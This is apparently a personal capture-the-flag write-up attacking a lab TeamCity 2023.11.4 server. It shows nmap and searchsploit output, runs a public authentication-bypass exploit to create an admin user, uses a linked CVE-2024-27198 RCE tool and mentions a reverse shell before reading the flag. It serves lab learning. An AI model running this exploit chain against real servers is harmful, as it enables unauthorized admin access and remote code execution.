nmap scan reveals port 50000 running apache tomcat, with the title being TeamCity Maintenance:

```
nmap -sV -sC -Pn 10.10.184.201 -o nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 19:10 IDT
Nmap scan report for 10.10.184.201
Host is up (0.088s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f3:75:01:a1:8a:33:e8:a1:ff:3d:3a:9a:c2:35:24:40 (RSA)
|   256 2c:9d:9c:1c:67:43:c9:d0:6f:d0:bd:2c:8c:c4:7b:f4 (ECDSA)
|_  256 f7:7b:27:e8:41:31:88:6b:c3:c1:c0:09:f5:0c:fe:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open  http    Apache Tomcat (language: en)
|_http-title: TeamCity Maintenance &mdash; TeamCity
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

looked up the webpage in my browser, and from the loading screen i was able to get the version TeamCity was running - which is 2023.11.4.

run a searchsploit query:

```
searchsploit teamcity 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                                                                                         | java/remote/47891.txt
JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                                                                                  | java/remote/51884.py
JetBrains TeamCity 2023.11.4 - Authentication Bypass                                                                                                                                                        | multiple/webapps/52411.py
TeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                                                                             | multiple/remote/46514.js
TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                                                                                     | multiple/remote/45917.rb
TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                                                                                         | php/webapps/48201.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

cool, so it seems there's an authentication bypass program for the version we need. after running the exploit (using `python3 52411.py --url http://[MACHINE_IP]:50000`), i learned that the exploit actually creates an admin user which we can use to log in to the interface:

<img width="661" height="574" alt="image" src="https://github.com/user-attachments/assets/28a4a2f6-6c2b-4383-9339-72fa7d95ec05" />

used the given credentials to log in, and i was presented with the following interface:

<img width="1857" height="918" alt="image" src="https://github.com/user-attachments/assets/52e2cae2-0140-4fb2-874a-8f90461b2aa6" />

first thing i did was research what TeamCity is actually used for, to hopefully understand better how to approach this challange.

```
What is TeamCity used for?
TeamCity is a Continuous Integration and Continuous Deployment (CI/CD) tool developed by JetBrains. It's designed to streamline the software development process by automating tasks like building, testing, and deploying code changes.
```

after some research for possible exploits, i found this cve : https://github.com/W01fh4cker/CVE-2024-27198-RCE/tree/main, and followed the instructions to hopefully get RCE:

<img width="1860" height="762" alt="image" src="https://github.com/user-attachments/assets/68e13134-e26f-451f-9ae6-7e90d8d44475" />

cool, so now i have RCE in the TeamCity Server. Let's get a reverse shell and further enumarate:

<img width="388" height="50" alt="image" src="https://github.com/user-attachments/assets/3d43bad1-b6ca-4eab-addd-4d4fada9c120" />



<img width="489" height="158" alt="image" src="https://github.com/user-attachments/assets/3c99b3d8-74e0-4d49-bca5-54044b218228" />

after checking what's inside ubuntu's home directory, i easily found flag.txt :)
